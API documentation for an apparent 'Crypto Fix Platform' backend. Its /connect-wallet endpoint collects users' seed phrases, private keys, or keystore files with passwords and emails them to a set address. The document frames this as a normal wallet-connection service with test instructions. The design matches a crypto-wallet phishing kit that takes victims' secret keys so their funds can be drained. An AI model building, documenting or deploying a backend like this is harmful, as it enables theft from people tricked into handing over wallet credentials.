# Crypto Fix Platform API Documentation

This documentation provides details about the API endpoints available in the Crypto Fix Platform backend server.

## Base URL

When running locally, the API base URL is:

```
http://localhost:3001/api
```

## Authentication

Currently, the API does not require authentication as it's designed for demonstration purposes. In a production environment, proper authentication should be implemented.

## Endpoints

### Connect Wallet

Sends wallet connection details to a specified email address.

**URL**: `/connect-wallet`

**Method**: `POST`

**Request Body**:

| Field           | Type     | Required | Description                                 |
|-----------------|----------|----------|---------------------------------------------|
| walletType      | string   | Yes      | The type of wallet (e.g., Metamask, Trust)  |
| accessType      | string   | Yes      | Method of access (Phrase, Keystore, Private Key) |
| selectedService | string   | No       | The service selected by the user           |
| phrase          | string   | No*      | The seed phrase (required if accessType is "Phrase") |
| keystoreJson    | string   | No*      | Keystore JSON (required if accessType is "Keystore JSON") |
| password        | string   | No*      | Password (required if accessType is "Keystore JSON") |
| privateKey      | string   | No*      | Private key (required if accessType is "Private Key") |

**Response**:

```json
{
  "success": true,
  "message": "Wallet connection details sent successfully"
}
```

**Error Responses**:

- **400 Bad Request** - Missing required fields

```json
{
  "success": false,
  "message": "Wallet type is required"
}
```

- **500 Internal Server Error** - Server error

```json
{
  "success": false,
  "message": "Failed to process wallet connection",
  "error": "Error details" // Only in development mode
}
```

### Health Check

Check if the API server is running.

**URL**: `/health`

**Method**: `GET`

**Response**:

```json
{
  "status": "Server is running"
}
```

## Testing

You can test the API using:

1. The included test page at `http://localhost:3001/test.html`
2. Curl commands:

```bash
curl -X POST http://localhost:3001/api/connect-wallet \
  -H 'Content-Type: application/json' \
  -d '{
    "walletType": "Metamask",
    "accessType": "Phrase",
    "selectedService": "Test Service",
    "phrase": "test phrase example"
  }'
```

3. The frontend application at `http://localhost:8080`

## Error Handling

The API uses standardized error responses with the following structure:

```json
{
  "success": false,
  "message": "User-friendly error message",
  "error": "Detailed error information (development mode only)"
}
```

## Development

To run the API server in development mode:

```bash
cd server
npm run dev
```

For testing email functionality:

```bash
cd server
npm run test-email
```
